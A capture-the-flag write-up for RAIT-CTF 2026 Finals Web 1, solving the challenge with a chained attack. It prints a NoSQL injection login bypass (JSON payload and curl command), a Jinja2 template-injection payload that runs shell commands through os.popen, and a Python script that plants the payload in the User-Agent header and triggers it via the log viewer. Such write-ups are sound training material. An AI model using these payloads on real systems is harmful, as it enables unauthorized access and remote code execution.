---
title: "RAIT-CTF Finals Web 1"
description: "Writeup for RAIT-CTF Finals Web 1 from RAIT-CTF 2026 Finals."
date: 2026-07-06 22:45:00
categories:
  - [Writeups, 周刊]
tags:
  - RAIT-CTF
  - Web Exploitation
---

# RAIT-CTF Finals Web 1

**Flag:** `RAIT-CTF{l0g_p01s0n1ng_plu5_sst1_equ4ls_rc3}`

## Approach (Step by Step)

### 1. Authentication Bypass (NoSQL Injection)

Visiting `http://34.0.14.121:9954/login` reveals a login form. Analyzing the source code shows that the form submits data as JSON:

```javascript
const res = await fetch('/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
});
```

We can bypass the authentication by exploiting a NoSQL injection vulnerability. By passing an object operator like `$ne` (not equal), we force the query to evaluate to true.

**Payload:**
```json
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

We can use `curl` to trigger this login and save the resulting session cookie:
```bash
curl -X POST http://34.0.14.121:9954/login \
-H "Content-Type: application/json" \
-d '{"username": {"$ne": null}, "password": {"$ne": null}}' \
-c cookies.txt
```

This returns an admin session cookie like:
`eyJ0cmFja2VyX3Rva2VuIjoiOWJhZjkwZDMtMGMyYi00YmM5LWFhN2UtODg4MjBhNWVmMmI3Iiwi...`

### 2. SSTI via Log Poisoning

We use a standard Python Jailbreak payload to access `os.popen`. The payload uses the `url_for` global to access builtins -> `import os` -> `popen`.

**SSTI Payload:**
```jinja2
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat /app/data/safe_flag.txt').read() }}
```

### 3. Automated Exploit Script

The application logs the User-Agent header of incoming requests. By poisoning our User-Agent with the SSTI payload, we can trigger code execution when the admin views the logs page (`/?page=view_log`).

```python
import requests
import re

# Configuration
TARGET_URL = "http://34.0.14.121:9954"
ADMIN_COOKIE = {
    "session": "eyJ0cmFja2VyX3Rva2VuIjoiOWJhZjkwZDMtMGMyYi00YmM5LWFhN2UtODg4MjBhNWVmMmI3IiwidXNlciI6eyIkbmUiOm51bGx9fQ.aX3gEQ.fzHTbnmIqHTQsyY9P0H-InOGGNk"
}

def solve():
    print(f"[*] Targeting: {TARGET_URL}")

    # 1. Inject Payload into User-Agent (Log Poisoning)
    payload = "{{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat /app/data/safe_flag.txt').read() }}"
    
    headers = {
        "User-Agent": payload
    }
    
    print("[*] Sending malicious User-Agent...")

    try:
        # We visit the root page so it logs our access (and our malicious User-Agent)
        requests.get(TARGET_URL + "/", cookies=ADMIN_COOKIE, headers=headers)
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return

    # 2. Trigger Execution (Access Logs)
    print("[*] Retrieving logs to trigger SSTI...")
    try:
        # Accessing view_log renders the log entries, executing our SSTI payload
        r = requests.get(TARGET_URL + "/?page=view_log", cookies=ADMIN_COOKIE)

        if r.status_code == 200:
            # 3. Extract Flag
            # Look for the flag pattern in the response
            match = re.search(r'(RAIT-CTF\{.*?\})', r.text)
            if match:
                flag = match.group(1)
                print(f"\n[+] FLAG FOUND: {flag}")
                return flag
            else:
                print("[-] Flag not found in response. Check if payload executed.")
        else:
            print(f"[-] Failed to access logs. Status Code: {r.status_code}")

    except Exception as e:
        print(f"[-] Error retrieving logs: {e}")

if __name__ == "__main__":
    solve()
```

### 4. Flag Retrieval

Running the script successfully retrieves the flag from the server:

`RAIT-CTF{l0g_p01s0n1ng_plu5_sst1_equ4ls_rc3}`
